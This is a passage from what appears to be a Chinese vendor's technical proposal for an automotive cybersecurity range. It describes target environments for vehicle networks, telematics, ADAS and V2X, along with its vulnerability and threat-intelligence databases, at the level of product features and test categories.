靶标的开发；</li><li>提供靶标制作的环境，支持qemu；</li><li>提供靶标制作工具，包含靶标文件系统提取工具；</li><li>提供制作靶标的输入需求，包含靶标固件或靶标访问方法、靶标对应架构配套的虚拟内核、根文件系统、qcow2磁盘镜像；</li><li>MPU靶标对实物还原度包括系统目录、shell界面、文件系统、磁盘分区、通用网卡驱动、应用程序，对以上内容虚拟化覆盖率应达到100%；提供的靶标应覆盖85%以上固件安全检测项，包含固件算法分析检测；密钥硬编码检测；服务接口访问安全；隐藏后门；敏感数据；配置文件安全；固件加固安全；提供的靶标覆盖80%以上系统安全检测项，包含Root检测，Root防御、系统修复、系统防篡改等检测；系统启动安全检测，系统漏洞检测等；权限等级设置检查；内存隔离安全性测试；应用授权管理安全性测试；系统服务安全性测试；提供的靶标应覆盖90%以上数据存储安全检测，包含数据加密存储检查，如配置参数、日志数据等敏感信息加密存储；数据完整性检测；敏感数据访问控制检测；数据存取错误反馈检测，非硬件存储密钥管理检测，敏感数据残留检测等；提供的靶标应100%覆盖车内通信安全检测，包含与CAN上车内控制单元的安全策略检测；与其他ECU通信的安全策略检测；CAN报文抗重放测试；CAN总线模糊测试；诊断访问信息安全测试；诊断数据包防御信息安全测试；诊断模糊测试；诊断复位测试；诊断读写服务测试；诊断动作指令测试；诊断通讯控制服务测试；车载以太网服务认证测试；车载以太网重放攻击测试；车载以太网未授权接入；车载以太网模糊测试；车载以太网端口扫描；提供的靶标应100%覆盖日志检测，包含应用程序日志内容检测；</li><li>我司三年内免费提供新业务平台靶标开发支持。</li></ol><h3 id="E-E架构通信网络靶标开发方案"><a href="#E-E架构通信网络靶标开发方案" class="headerlink" title="E/E架构通信网络靶标开发方案"></a>E/E架构通信网络靶标开发方案</h3><p>我司为本项目提供E/E架构通信网络靶标开发，所开发的参数满足要求。</p><p>在E/E架构通信网络靶标开发过程中，我司遵循产品定制开发的基本原则，基于E/E架构通信网络的特性进行靶标开发，按照甲方需求，完成相应的靶标库开发工作。</p><ol><li>靶标库需求分析</li></ol><p>根据确定E/E架构通信网络靶标的应用需求，在E/E架构下的通信主要需满足LIN、CAN、ETH-T1、CANFD总线协议的通信拓扑，靶标可满足此拓扑下的基本通信功能，通过靶标的部署，满足现有和在研车型的车载网络通信靶标，并根据车型创建模板，模板支持更新。</p><ol><li>软件开发</li></ol><p>首先，完成开发与E/E架构通信网络相关的软件模块，基于模板部署通信安全组件，支持SecOC组件，可以将已开发完成的模型、组件、应用的部署，支持基于模板部署入侵检测组件，支持车载IDS，并将预警信息回传至云端平台进行处理。</p><ol><li>硬件开发</li></ol><p>设计与E/E架构通信网络靶标相关的硬件电路，包括通信网络接口、总线控制器和节点电路等，考虑电路稳定性、可靠性、及安全性以及与外部设备的连接方式，我们设计了靶标的CPU、内存、硬盘资源可自定义配置，并对配置做最低要求限制，避免靶标因资源不足出现系统资源占用率过高，应用无法正常运行等。</p><p>硬件的设计可满足8个现有和在研车型的车载网络通信靶标，满足LIN、CAN、CANFD总线协议的通信拓扑靶标，通过技术开发手段，编写靶标信息，并根据车型创建模板，模板还能更新。可进行已开发完成的模型、组件、应用的部署。</p><ol><li>驱动程序开发</li></ol><p>设计开发与通信网络相关的底层驱动程序，实现硬件与软件之间的接口和通信功能，进行驱动程序的调试和测试，确保其正确性和稳定性。驱动程序可满足通信网络靶标对实物还原度85%以上，包括SecOC、IDS等可运行的CAN/CANFD、车载以太网等不完全以来硬件的网络环境。在靶标库中提供的靶标应100%覆盖通信业务安全检测，包含车载CAN总线抗DoS测试、CAN报文抗重放测试、CAN总线模糊测试、诊断访问信息安全测试、诊断数据包防御信息安全测试、诊断模糊测试、诊断复位测试、诊断读写服务测试；诊断动作指令测试、诊断通讯控制服务测试、车载以太网服务认证测试；车载以太网重放攻击测试、车载以太网未授权接入、车载以太网模糊测试、车载以太网端口扫描等。</p><p>基于模板部署通信安全组件和入侵检测组件可支持SecOC和车载IDS。提供信拓扑模板5个，包含的靶标节点20个，并支持10个通信模板靶标的开发。</p><ol><li>产品彩页</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/8dec8dc3185c7fdef4604c42a718e895.png"></p><ol><li>E/E架构通信网络靶标功能参数</li><li>支持8个现有和在研车型的车载网络通信靶标；</li><li>支持LIN、CAN、CANFD总线协议的通信拓扑靶标，并根据车型创建模板，模板支持更新，产品功能截图证明见下图：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/6bfa90bd3efcc0b8e621f2669cd70e8a.png"></p><p>LIN通信拓扑</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/78fa136bebcf04a8b87bc994ff6b0ae9.png"></p><p>CAN通信拓扑</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/17c4fcad99af9f7977fec87f8c81a51c.png"></p><p>CANFD通信拓扑</p><ol><li>支持车载以太网的通信拓扑靶标，并根据车型创建模板，模板支持更新；</li><li>支持基于模板部署通信安全组件，至少支持SecOC；</li><li>支持已开发完成的模型、组件、应用的部署；</li><li>靶标的CPU、内存、硬盘资源可自定义配置，并对配置做最低要求限制，避免靶标因资源不足出现系统资源占用率过高，应用无法正常运行等；</li><li>支持基于模板部署入侵检测组件，至少支持车载IDS；</li><li>提供靶标制作方法教程；</li><li>提供靶标制作培训；</li><li>初始通信拓扑模板不少于5个，包含的靶标节点不少于20个；</li><li>提供不少于10个通信模板靶标的开发；</li><li>通信网络靶标对实物还原度不低于85%，包括SecOC、IDS等可运行的CAN/CANFD、车载以太网等不完全以来硬件的网络环境；提供的靶标应100%覆盖通信业务安全检测，包含车载CAN总线抗DoS测试；CAN报文抗重放测试；CAN总线模糊测试；诊断访问信息安全测试；诊断数据包防御信息安全测试；诊断模糊测试；诊断复位测试；诊断读写服务测试；诊断动作指令测试；诊断通讯控制服务测试；车载以太网服务认证测试；车载以太网重放攻击测试；车载以太网未授权接入；车载以太网模糊测试；车载以太网端口扫描；</li><li>三年内免费提供新业务平台靶标开发支持。</li></ol><h3 id="车联网安全场景靶标开发方案"><a href="#车联网安全场景靶标开发方案" class="headerlink" title="车联网安全场景靶标开发方案"></a>车联网安全场景靶标开发方案</h3><p>我司为本项目提供车联网安全场景靶标开发，所开发的参数满足要求。</p><p>在车联网安全场景靶标开发过程中，我司遵循产品定制开发的基本原则，基于车联网通信网络的特性进行靶标开发，按照甲方需求，完成相应的靶标库开发工作。</p><ol><li>靶标库需求分析</li></ol><p>首先确定车联网安全场景靶标库的目标网络和应用场景，分析车联网安全场景的需求和威胁情况，确定靶标库支持的车辆通信网络和相关协议，如CAN、Ethernet、LIN等。在设计中可满足远程升级、数字钥匙、自主代客泊车、远程控车场景的云平台靶标要求。</p><ol><li>靶标库设计</li></ol><p>设计车联网安全场景靶标库的数据结构和算法，完全考虑车辆通信网络的安全漏洞和攻击方式，定义相应的靶标场景，确定靶标库需要提供的安全特征和指标，如攻击模式、异常行为等。远程升级、数字钥匙、自主代客泊车、远程控车场景的云平台靶标，靶标库可实现服务端移动端APP部署、单点部署和基群部署，包含了云平台镜像更新升级、支持云平台镜像快速生成、数字钥匙功能、远程升级等功能（平台的管理功能、配置功能、车型管理功能、升级下发功能等）。</p><p>其中数字钥匙功能包括零件管理功能、车辆、车型管理功能、用户管理等基础功能。</p><p>在平台方面，此靶标开发可以完成多维度的用户、角色、权限管理。在存在大多数人员角色管理的同时，能够批量或者单独为用户配置权限，且可以查看用户的操作记录。平台的大数据还具备分析功能，整体后台能收集、产生的信息进行分析、呈现，包括车辆总数、车辆活跃状态、车辆ECU软件版本情况、升级任务执行成功率等。车辆、车型管理功能，车辆绑定车型，车型关联ECU信息。支持ECU软件版本管理功能，每个软件包只能唯一关联到一个ECU，每个ECU的软件版本号应唯一。可以在平台查看每辆车的所有ECU详细软硬件信息。</p><p>升级包管理功能中，平台对用户上传的ECU各部分软件打包（如MCU升级包、MPU升级包、配置文件等）、签名、加密等生成ECU的最终升级文件。</p><p>在任务管理中，升级任务支持创建、审核、取消、执行、状态监控等功能。日志管理功能中，能对车辆上传的升级日志信息进行存储、分析处理。</p><ol><li>靶标开发</li></ol><p>开发车联网安全场景靶标库的软件模块，实现靶标库的数据生成和模拟功能，以模拟各种安全攻击和异常行为，考虑靶标库的可扩展性，以支持新的安全场景和攻击方式的添加。</p><ol><li>靶标验证</li></ol><p>使用靶标库生成的数据进行验证和测试，确保靶标库能够准确地模拟各种安全攻击和异常行为，进行功能测试和性能测试，验证靶标库的功能和性能是否符合要求。</p><ol><li>产品彩页</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7b96a3b029ffc0a91b4a7535945ca23d.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/bd2586b7cb8affceacb958efa93de024.png"></p><ol><li>车联网安全场景靶标开发功能参数</li><li>支持远程升级、数字钥匙、自主代客泊车、远程控车场景的云平台靶标；</li><li>支持服务端单点部署和基群部署；</li><li>支持移动端APP部署；</li><li>支持云平台镜像更新升级；</li><li>支持云平台镜像快速生成；</li><li>远程升级支持以下功能；</li><li>平台支持零件管理功能，按照ECU类型分类管理；</li><li>平台支持车辆、车型管理功能，车辆绑定车型，车型关联ECU信息。可以在平台查看每辆车的所有ECU详细软硬件信息；</li><li>平台支持ECU软件版本管理功能，每个软件包只能唯一关联到一个ECU，每个ECU的软件版本号应唯一；</li><li>平台支持升级包管理功能。对用户上传的ECU各部分软件打包（如MCU升级包、MPU升级包、配置文件等）、签名、加密等生成ECU的最终升级文件；</li><li>平台支持差分功能，可以通过对软件版本做差分处理，减少生成的最终升级文件大小；</li><li>平台支持升级策略管理。通过升级策略限定每次升级的范围（如：单辆车、小批量、所有车辆等）达到灰度升级的目的；</li><li>平台支持升级任务管理。包括升级任务创建、升级任务审核、升级任务取消、升级任务执行状态监控等功能；</li><li>平台支持日志管理功能。对车辆上传的升级日志信息进行存储、分析处理；</li><li>平台支持大数据分析功能。对于后台收集、产生的信息进行分析、呈现，包括车辆总数、车辆活跃状态、车辆ECU软件版本情况、升级任务执行成功率等；</li><li>平台支持多维度的用户、角色、权限管理。能够批量或者单独为用户配置权限，且可以查看用户的操作记录；</li><li>数字钥匙支持以下功能；</li><li>平台支持钥匙生命周期管理；</li><li>平台支持零件管理功能；</li><li>平台支持车辆、车型管理功能；</li><li>平台持用户管理；</li><li>提供靶标制作方法教程；</li><li>提供靶标制作培训；</li><li>初始提供靶标包含远程升级、数字钥匙、远程控车、远程诊断；</li><li>车联网靶标100%完全还原业务平台，包括操作系统、应用程序、分布式部署；</li><li>靶标的CPU、内存、硬盘资源可自定义配置，并对配置做最低要求限制，避免靶标因资源不足出现系统资源占用率过高，应用无法正常运行等；</li><li>三年内免费提供新业务平台靶标开发支持。</li></ol><h3 id="ADAS靶标开发方案"><a href="#ADAS靶标开发方案" class="headerlink" title="ADAS靶标开发方案"></a>ADAS靶标开发方案</h3><p>我司为本项目提供ADAS靶标开发，所开发的参数满足要求。</p><p>在ADAS靶标开发过程中，我司遵循产品定制开发的基本原则，基于ADAS通信网络的特性进行靶标开发，按照甲方需求，完成相应的靶标库开发工作。</p><ol><li>靶标库需求分析</li></ol><p>确定ADAS靶标的应用场景，如自动紧急制动、自适应巡航控制等。根据现有市场所分析ADAS系统的功能和性能要求，如传感器数据处理、决策算法等。确定靶标支持的传感器类型和相关协议，如摄像头、雷达、激光雷达等。</p><ol><li>靶标库设计</li></ol><p>设计ADAS安全场景靶标库的数据结构和算法，智能驾驶网络安全动态仿真系统实物靶标接入，开发ADAS靶标库的软件模块。实现靶标库的数据生成和模拟功能，以模拟各种驾驶场景和传感器数据。考虑靶标库的可扩展性，以支持新的驾驶场景和传感器类型的添加。</p><p>主要的ADAS场景包括ACC、AEB、FCW、IHBC、TSR、LDW、LKA，分别如下：</p><p>自适应巡航控制（Adaptive Cruise Control，ACC）：ACC利用雷达或摄像头等传感器监测前方车辆的距离和速度，自动调整车辆的速度以保持安全距离。</p><p>自动紧急制动（Automatic Emergency Braking，AEB）：AEB通过车辆前部的传感器监测前方障碍物，如果检测到碰撞风险，系统会自动触发紧急制动以避免或减轻碰撞。</p><p>车道保持辅助（Lane Keeping Assist，LKA）：LKA使用摄像头或传感器来检测车辆在车道内的位置，如果车辆偏离车道，系统会发出警告或施加轻微的转向力以纠正车辆的行驶轨迹。</p><p>盲点监测（Blind Spot Detection，BSD）：BSD利用传感器监测车辆侧后方的盲点区域，如果有其他车辆进入盲点，系统会发出警告，提醒驾驶员注意。</p><p>车道变换辅助（Lane Change Assist，LCA）：LCA帮助驾驶员进行车道变换，当驾驶员打开转向灯时，系统会监测并发出警告，以提醒驾驶员注意周围的车辆。</p><p>前方碰撞警告（Forward Collision Warning，FCW）：FCW使用传感器监测前方车辆和障碍物，如果检测到碰撞风险，系统会发出警告，提醒驾驶员采取行动。</p><p>目标识别和识别（Object Detection and Recognition）：这项技术使用摄像头、雷达等传感器来识别并跟踪道路上的车辆、行人、自行车等目标，以提供更全面的环境感知。</p><p>智能远光灯控制（Intelligent High Beam Control，IHBC）：IHBC利用车辆上的摄像头或传感器来检测前方来车或其他车辆的尾灯，并根据检测结果自动切换远光灯和近光灯，以提供最佳的照明效果和安全性。</p><p>交通标志识别（Traffic Sign Recognition，TSR）：TSR使用车辆上的摄像头或传感器来识别道路上的交通标志，例如限速标志、禁止标志等，并将这些信息显示在驾驶员的仪表盘或导航屏幕上，帮助驾驶员及时了解道路规则和限制。</p><p>车道偏离警告（Lane Departure Warning，LDW）：LDW通过车辆上的摄像头或传感器来监测车辆在车道内的位置，如果检测到车辆偏离当前车道，系统会发出警告，提醒驾驶员采取措施纠正车辆的行驶轨迹，以减少意外事故的风险。</p><ol><li>靶标验证</li></ol><p>使用靶标库生成的数据进行验证和测试,确保靶标库能够准确地模拟各种驾驶场景和传感器数据,进行功能测试和性能测试，验证靶标库的功能和性能是否符合要求。</p><ol><li>产品彩页</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/46b750e332f0edc44b0d982130289e8e.png"></p><ol><li>ADAS靶标开发功能参数</li><li>支持ACC场景的靶标；</li><li>支持AEB场景的靶标；</li><li>支持FCW场景的靶标；</li><li>支持IHBC场景的靶标；</li><li>支持TSR场景的靶标；</li><li>支持LDW场景的靶标；</li><li>支持LKA场景的靶标；</li><li>支持智能驾驶网络安全动态仿真系统实物靶标接入；</li><li>我司提供靶标制作方法教程；</li><li>我司提供靶标制作培训；</li><li>我司三年内免费提供新业务平台靶标开发支持。</li></ol><h3 id="V2X靶标开发方案"><a href="#V2X靶标开发方案" class="headerlink" title="V2X靶标开发方案"></a>V2X靶标开发方案</h3><p>我司为本项目提供V2X靶标开发，所开发的参数满足要求。</p><p>在V2X靶标开发过程中，我司遵循产品定制开发的基本原则，基于V2X通信网络的特性进行靶标开发，按照甲方需求，完成相应的靶标库开发工作。</p><ol><li>靶标库需求分析</li></ol><p>V2X（Vehicle-to-Everything）是指车辆与周围环境中的各种实体（如其他车辆、道路设施、行人等）进行通信和交互的技术。</p><p>首先，V2X靶标开发的具体需求和目标是支持PC5和UU通信中相关的靶标实现，如服务器、终端等。这些包括特定的通信场景、交互功能、安全性要求等。这些可以确保我们在开发过程中明确定义项目的范围和目标。</p><ol><li>靶标库设计</li></ol><p>选择适合的硬件平台来支持V2X通信，这包括车载单元（On-Board Unit，OBU）、路侧单元（Roadside Unit，RSU）等设备，同时支持车与车、车与路边单元、车与云靶标场景。考虑到通信范围、处理能力、安全性和可靠性等因素，我们基于适合本项目的平台进行开发。</p><p>根据开发的通信协议，实施V2X通信靶标，并进行测试和验证。将涉及到硬件设备的配置、软件的开发和集成、通信性能的测试等。确保靶标的功能和性能符合预期，并满足相关的性能指标和安全要求。</p><p>设计开发出满足车与车、车与路边单元、车与云靶标场景，同时支持PC5和UU通信协议，可进行数字证书签名验签安全性靶标，完成协议的拒绝服务、数据安全、加密传输及双向认证测试。</p><ol><li>产品彩页</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/acea8bfad44416ed305963d75c4e074e.png"></p><ol><li>V2X靶标功能参数</li><li>支持车与车、车与路边单元、车与云靶标场景；</li><li>支持PC5通信拒绝服务攻击靶标；</li><li>支持PC5网络通信数据安全靶标；</li><li>支持PC5通信加密传输靶标。；</li><li>支持PC5双向认证安全性靶标</li><li>支持UU通信拒绝服务攻击靶标；</li><li>支持UU网络通信数据安全靶标；</li><li>支持UU通信加密传输靶标；</li><li>支持UU双向认证安全性靶标；</li><li>支持数字证书签名验签安全性靶标；</li><li>我司提供靶标制作方法教程；</li><li>我司提供靶标制作培训；</li><li>我司三年内免费提供新业务平台靶标开发支持。</li></ol><h1 id="智能汽车网络靶场知识库"><a href="#智能汽车网络靶场知识库" class="headerlink" title="智能汽车网络靶场知识库"></a>智能汽车网络靶场知识库</h1><p>靶场知识库支持与靶场、汽车安全运营平台对接，实现关联分析能力、场景化分析能力，提高告警处置。测试人员通过靶场和汽车全运营平台可对知识库数据进行查看，并对数据进行维护管理。</p><h2 id="智能汽车网络靶场漏洞库"><a href="#智能汽车网络靶场漏洞库" class="headerlink" title="智能汽车网络靶场漏洞库"></a>智能汽车网络靶场漏洞库</h2><p>车联网安全涉及云端业务系统、移动端APP资产和车端各类组件资产。建设面向车联漏洞运营管理体系，提供全面漏洞信息，进行有效的管理筛选，快速处置关键风险。</p><p>漏洞库全面支持对漏洞内容的管理，支持下述相关功能。</p><h3 id="靶场漏洞库方案"><a href="#靶场漏洞库方案" class="headerlink" title="靶场漏洞库方案"></a>靶场漏洞库方案</h3><p>漏洞收集：建立一个广泛的漏洞收集机制，包括对智能汽车相关组件、协议、应用程序等进行安全研究和漏洞挖掘，以获取最新的漏洞信息。可以通过安全研究人员、漏洞报告、公开漏洞数据库等渠道进行漏洞收集。标注出漏洞编号、漏洞名称、漏洞类型、影响级别、漏洞描述、修复建议、数据来源等信息等内容。</p><p>漏洞分类和归档：对收集到的漏洞进行分类和归档，建立一个结构化的漏洞库。可以按照漏洞的类型、影响程度、风险级别等进行分类，方便用户进行漏洞搜索和筛选。包括漏洞利用方式，如是否需要交互、是否需要进行认证、漏洞利用条件、漏洞触发方式、漏洞直接后果、漏洞影响范围等。</p><p>漏洞验证：对收集到的漏洞进行验证，确保漏洞的真实性和可复现性。可以建立一套漏洞验证流程和环境，通过模拟智能汽车的网络环境和攻击场景，验证漏洞的存在和影响。</p><p>漏洞描述和漏洞报告：对每个漏洞进行详细的描述和漏洞报告，包括漏洞的利用条件、攻击方式、影响范围、修复建议等信息。漏洞报告应该清晰、准确地描述漏洞的实际情况，方便用户理解和应对。</p><p>漏洞管理和更新：建立一个漏洞管理系统，对漏洞进行版本管理和更新。及时跟踪漏洞的修复情况和安全补丁的发布，确保漏洞库的及时更新和漏洞信息的准确性。</p><p>漏洞利用环境：为用户提供一个安全的漏洞利用环境，包括搭建合适的实验环境和提供相应的工具和资源。用户可以在这个环境中学习和实践漏洞利用技术，提高对智能汽车网络安全的理解和应对能力。</p><p><strong>漏洞信息内容</strong></p><p>将提供详细的漏洞信息，包括漏洞编号、漏洞名称、漏洞类型、影响级别、漏洞描述、修复建议、数据来源等信息。将确保漏洞信息的准确性和完整性。</p><p><strong>漏洞定性定级</strong></p><p>支持对漏洞进行定性定级，包括判断漏洞利用方式是否需要交互、是否需要进行认证、漏洞利用条件、漏洞触发方式、漏洞直接后果和漏洞影响范围等。这将更好地了解漏洞的严重程度和风险。</p><p><strong>漏洞优先级排序模型</strong></p><p>具备漏洞优先级排序功能，能够自动关联漏洞与利用情报、网关防御规则，进行漏洞的优先级排序。这将更好地管理和处理漏洞，确保关键风险得到及时处置。</p><p><strong>漏洞知识库</strong></p><p>包含了汽车网络和传统网络相关的漏洞信息，并支持第三方漏洞数据对接，如CVE、CNVD等漏洞信息。漏洞库条目整合了CVE、CNNVD、CNVD条目为一条，而非分开存放，漏洞条目数量超过9万条。</p><p><strong>漏洞更新频次</strong></p><p>支持自定义漏洞更新频次，可以按周、月等进行更新。对于重大漏洞情报，将及时更新，确保始终拥有最新的安全信息。</p><p><strong>靶场知识图谱关联</strong></p><p>支持与靶场知识图谱进行关联，进一步提升漏洞管理和处置的准确性和效率。</p><p><strong>汽车漏洞数量和专用漏洞协助</strong></p><p>初始数量已达到2000条汽车漏洞，并将协助根据现有测试数据、众测活动及漏洞提交平台审核通过的漏洞数据总结出至少200个专用漏洞。还支持已有测试数据中的漏洞导入，并提供专用漏洞库加密存储功能，确保数据的安全性。</p><h4 id="产品彩页"><a href="#产品彩页" class="headerlink" title="产品彩页"></a>产品彩页</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/eca49ef03a890d6cfaedd8bab66c415a.png"></p><h4 id="产品参数"><a href="#产品参数" class="headerlink" title="产品参数"></a>产品参数</h4><ol><li>漏洞信息内容包含：漏洞编号、漏洞名称、漏洞类型、影响级别、漏洞描述、修复建议、数据来源等信息；</li><li>支持漏洞定性定级：包括漏洞利用方式是否需要交互、是否需要进行认证、漏洞利用条件、漏洞触发方式、漏洞直接后果、漏洞影响范围；</li><li>具备漏洞优先级排序模型，支持漏洞与利用情报、网关防御规则自动关联，进行漏洞优先级排序；</li><li>漏洞知识库包含汽车网络、传统网络相关的漏洞信息，同时支持第三方漏洞数据对接，如CVE、CNVD等漏洞信息；</li><li>漏洞库条目整合CVE、CNNVD、CNVD条目为一条，而非分开存放，漏洞条目10万余条万条；产品功能截图如下图：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d65d021ba2c33469f8d5e131d5f1a486.png"></p><ol><li>漏洞更新频次可自定义周、月等，重大漏洞情报应及时更新</li><li>支持与靶场知识图谱进行关联；</li><li>汽车漏洞初始数量达到2000条；</li><li>根据客户历史车型和在测车型（20个车型）漏洞补充车端漏洞库；</li><li>协助客户根据现有测试数据、众测活动及漏洞提交平台审核通过的漏洞数据总结出专用漏洞；</li><li>支持已有测试数据中的漏洞导入；</li><li>支持专用漏洞库加密存储；</li><li>协助总结专用漏洞数不低于200个。</li></ol><h3 id="智能汽车网络靶场威胁情报库"><a href="#智能汽车网络靶场威胁情报库" class="headerlink" title="智能汽车网络靶场威胁情报库"></a>智能汽车网络靶场威胁情报库</h3><p>威胁情报库基于安全大数据能力，收集全球不同来源的汽车安全情报及网络安全情报数据，包括IP信誉、域名信誉、文件信誉、APT跟踪、历史活跃信息等。</p><h4 id="靶场威胁情报库方案"><a href="#靶场威胁情报库方案" class="headerlink" title="靶场威胁情报库方案"></a>靶场威胁情报库方案</h4><p>威胁情报收集：建立一个广泛的威胁情报收集机制，包括监测和收集来自各种渠道的威胁情报数据，如公开威胁情报源、黑客论坛、漏洞报告、安全研究报告等。能与威胁情报中心数据同步，内容包括APT攻击团伙、蠕虫木马、勒索软件、僵尸网络等相关的远程命令和控制服务器情报，用以发现被以上团伙控制的失陷资产，可以利用自动化工具和人工情报分析的方式，及时获取最新的威胁情报。</p><p>威胁情报分类和归档：对收集到的威胁情报进行分类和归档，建立一个结构化的威胁情报库。情报信息包含IP、域名、URL、SHA1、MD5等。录入内容字段应包括恶意类型、可信度、风险等级、威胁名称、情报来源、参考链接、威胁描述等。可以按照威胁类型、攻击方式、攻击目标等进行分类，方便用户进行威胁情报的搜索和筛选。</p><p>威胁情报分析和评估：对收集到的威胁情报进行分析和评估，可分析出勒索、挖矿、蠕虫、僵尸网络、木马后门、APT攻击所控制系统，本地失陷主机情报数量1000万余条并且精准度达到95%，确定其对智能汽车网络的威胁程度和潜在影响。可以利用威胁情报分析工具和技术，对威胁情报进行关联分析、威胁评估和风险评估，为用户提供准确的威胁情报信息。</p><p>威胁情报共享和交流：建立一个威胁情报共享平台，促进用户之间的威胁情报交流和共享。用户可以在平台上分享自己的威胁情报分析结果和经验，获取其他用户的反馈和建议，提高对智能汽车网络威胁的认识和应对能力。</p><p>威胁情报更新和通知：及时跟踪和更新威胁情报库中的数据，确保威胁情报的准确性和时效性。可以通过定期的更新机制和通知机制，向用户提供最新的威胁情报信息，帮助用户及时了解和应对新出现的威胁。</p><p>威胁情报可视化和报告：提供威胁情报可视化的功能，以图表、图形等形式展示威胁情报的统计数据和趋势分析。同时，生成详细的威胁情报报告，包括威胁分析结果、威胁评估、风险建议等，帮助用户更好地理解和应对威胁情报。</p><p><strong>失陷检测情报库</strong></p><p>在失陷检测情报库中，可完成与威胁情报中心数据同步，包括APT攻击团伙、蠕虫木马、勒索软件、僵尸网络等相关的远程命令和控制服务器情报，以上情报可用以发现被以上团伙控制的失陷资产。</p><p>其中情报信息包含IP、域名、URL、SHA1、MD5等，并能提供恶意类型、可信度、风险等级、威胁名称、情报来源、参考链接、威胁描述等字段。</p><p>在威胁情报库中，具有勒索、挖矿、蠕虫、僵尸网络、木马后门、APT攻击所控制系统，本地失陷主机情报数量1000万余条，并且精准度达到95%。</p><p><strong>APT情报</strong></p><p>在APT情报中可通过通过标准Restful-API提供APT档案库接口服务，也能够显示与APT组织团伙相关联的数据，我们包括了 团伙简介、团伙概述、技战法、APT情报、历史报告和数据可视化呈现。</p><p><strong>文件信誉</strong></p><p>建立了本地文件信誉库，包括文件的HASH信息（MD5、SHA1），通过该信誉库可以研判文件样本是否恶意、恶意类型、攻击团伙、家族信息、样本名称、文件类型、文件样本大小、最早发现时间以及定向攻击等信息。信誉热点库规模1000万余条，同时云端信誉库规模在200亿级，可满足在本地查询不到的数据时，可到云端信誉库进行查询后返回信息至本地，方便后期查询。</p><p><strong>IP信誉库</strong></p><p>IP信誉库不仅能与威胁情报中心数据同步，提供IP的网络基础信息以及攻击历史信息，这些信息中可直观看出是否是网关、IDC服务器、个人主机、运营商出口、基站、VPN或代理等。还能提供IP的地理位置，包括归属国家或地区，精确到城市，归属地经纬坐标等。</p><p>同时还可以基于IP的情报来源、源IP、IP归属地、源IP端口、威胁类别、协议类型、攻击开始时间等维度进行IP查询，并提供相关的危害等级评估与IP的置信度建议。我司提供的本地IP信誉情报数量规模有1000万余条。完全满足客户在后期的使用。</p><p><strong>汽车威胁情报库</strong></p><p>汽车威胁情报库不仅能提供汽车情报数据，包括汽车漏洞情报、行业事件情报。其中的漏洞信息不限于第三方同步漏洞信息（CVE、CNVD等），还包括通过SRC平台以及检测工具平台挖掘的漏洞信息（事件情报包含不限于通过公网扫描的威胁事件及情报信息等）。</p><p>同时汽车威胁情报库能使用漏洞利用情报，情报源包括全球权威的ExploitDB、Metasploit、CoreSecurity、PacketStorm、CxSecurity等，情报条目数量16万余条。情报信息包括发布时间、发布厂商、通告类型、影响地域、影响行业、威胁等级、攻击者组织、攻击者类型、通告详情等。完全满足客户在后期的使用。</p><p><strong>更新频次</strong></p><p>更新频次满足三种情况，一是可以在互联网情况下进行在线升级，情报库以小时级进行更新。二是在隔离网情况下，进行离线导入升级包方式进行升级，情报以天或周的频次进行更新。此外，还可通过非结构化情报的导入，格式包括docx、pdf、txt等。</p><h4 id="产品彩页-1"><a href="#产品彩页-1" class="headerlink" title="产品彩页"></a>产品彩页</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/43bca673e4d9f94dc5fa9a6950bfc7f3.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/1aeb885622c1525fa74373df8fa46424.png"></p><h4 id="产品参数-1"><a href="#产品参数-1" class="headerlink" title="产品参数"></a>产品参数</h4><p>失陷检测情报库：</p><p>支持与威胁情报中心数据同步，内容包括APT攻击团伙、蠕虫木马、勒索软件、僵尸网络等相关的远程命令和控制服务器情报，用以发现被以上团伙控制的失陷资产。</p><p>情报信息包含IP、域名、URL、SHA1、MD5等。录入内容字段应包括恶意类型、可信度、风险等级、威胁名称、情报来源、参考链接、威胁描述等。</p><p>支持勒索、挖矿、蠕虫、僵尸网络、木马后门、APT攻击所控制系统，本地失陷主机情报数量1000万余条并且精准度达到95%。</p><p>APT情报：</p><p>支持显示APT组织团伙相关联数据，相关联数据包括： 团伙简介、团伙概述、技战法、APT情报、历史报告和数据可视化呈现。功能截图如下图所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/29110ef00c038b1852b248a8cf561f66.png"></p><p>支持通过标准Restful-API提供APT档案库接口服务。</p><p>文件信誉：</p><p>支持本地文件信誉库，包括文件的HASH信息（MD5、SHA1），支持研判文件样本是否恶意、恶意类型、攻击团伙、家族信息、样本名称、文件类型、文件样本大小、最早发现时间以及定向攻击等信息。</p><p>支持本地文件信誉热点库规模1000万余条。</p><p>云端信誉库规模为200亿级，支持本地查询不到的数据可到云端信誉库进行查询后返回信息至本地，方便后期查询。</p><p>IP信誉库：</p><p>支持与威胁情报中心数据同步，提供IP的网络基础信息以及攻击历史信息，包括是否是网关、IDC服务器、个人主机、运营商出口、基站、VPN或代理等。</p><p>支持提供IP的地理位置包括归属国家或地区，精确到城市，归属地经纬坐标等。</p><p>支持基于IP的情报来源、源IP、IP归属地、源IP端口、威胁类别、协议类型、攻击开始时间等维度进行IP查询，并提供相关的危害等级评估与IP的置信度建议。</p><p>本地IP信誉情报数量规模1000万余条。</p><p>汽车威胁情报库：</p><p>提供汽车情报数据，不限于汽车漏洞情报、行业事件情报，漏洞包括第三方同步漏洞信息（CVE、CNVD等）、通过SRC平台以及检测工具平台挖掘的漏洞信息，事件情报包含不限于通过公网扫描的威胁事件及情报信息等。</p><p>支持漏洞利用情报，情报源包括全球权